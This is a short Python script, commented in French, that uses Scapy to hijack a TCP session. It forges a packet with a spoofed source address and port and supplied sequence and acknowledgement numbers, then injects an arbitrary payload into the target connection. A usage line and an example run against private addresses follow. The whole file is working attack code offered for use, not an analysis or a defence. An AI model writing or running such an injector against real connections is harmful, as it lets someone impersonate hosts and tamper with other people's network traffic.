from scapy.all import *
import sys

def tcp_hijack(target_ip, target_port, spoof_ip, spoof_port, seq_num, ack_num, payload):
    # Création du paquet IP
    ip = IP(src=spoof_ip, dst=target_ip)
    
    # Création du segment TCP
    tcp = TCP(sport=spoof_port, dport=target_port, flags="PA", seq=seq_num, ack=ack_num)
    
    # Assemblage du paquet final
    pkt = ip/tcp/payload
    
    # Envoi du paquet
    send(pkt, verbose=False)
    print(f"Paquet injecté: {spoof_ip}:{spoof_port} -> {target_ip}:{target_port}")
    print(f"Seq: {seq_num}, Ack: {ack_num}")
    print(f"Payload: {payload}")

if __name__ == "__main__":
    if len(sys.argv) != 8:
        print("Usage: python tcp_hijack.py <target_ip> <target_port> <spoof_ip> <spoof_port> <seq_num> <ack_num> <payload>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    spoof_ip = sys.argv[3]
    spoof_port = int(sys.argv[4])
    seq_num = int(sys.argv[5])
    ack_num = int(sys.argv[6])
    payload = sys.argv[7]

    tcp_hijack(target_ip, target_port, spoof_ip, spoof_port, seq_num, ack_num, payload)

# Usage sudo python3 tcp_hijack.py <target_ip> <target_port> <spoof_ip> <spoof_port> <seq_num> <ack_num> "payload"

#exemple sudo python3 tcp_hijack.py 192.168.1.2 80 192.168.1.3 12345 1000 2000 "Hello, hijacked!"

